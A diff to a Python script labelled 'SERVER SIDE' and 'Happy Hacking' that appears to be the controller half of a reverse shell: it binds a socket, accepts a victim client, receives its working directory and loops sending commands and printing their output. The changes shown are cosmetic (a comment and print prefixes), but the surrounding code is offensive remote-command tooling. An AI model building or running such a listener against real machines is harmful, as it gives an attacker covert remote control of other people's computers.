@@ -22,7 +22,7 @@ print("""
 \033[1;31mSERVER SIDE                   coded by kiana\033[1;31m\033[1;37m""")
 print("")
 
-# create a socket object
+# socket object
 s = socket.socket()
 
 # bind the socket to all IP addresses of this host
@@ -39,7 +39,7 @@ print(f"{client_address[0]}:{client_address[1]} Connected!")
 
 # receiving the current working directory of the client
 cwd = client_socket.recv(BUFFER_SIZE).decode()
-print("[+] Happy Hacking:", cwd)
+print("[XwX] Happy Hacking:", cwd)
 
 while True:
     # get the command from prompt
@@ -54,7 +54,7 @@ while True:
         break
     # retrieve command results
     output = client_socket.recv(BUFFER_SIZE).decode()
-    print("output:", output)
+    print("split:", output)
     # split command output and current directory
     results, cwd = output.split(SEPARATOR)
     # print output
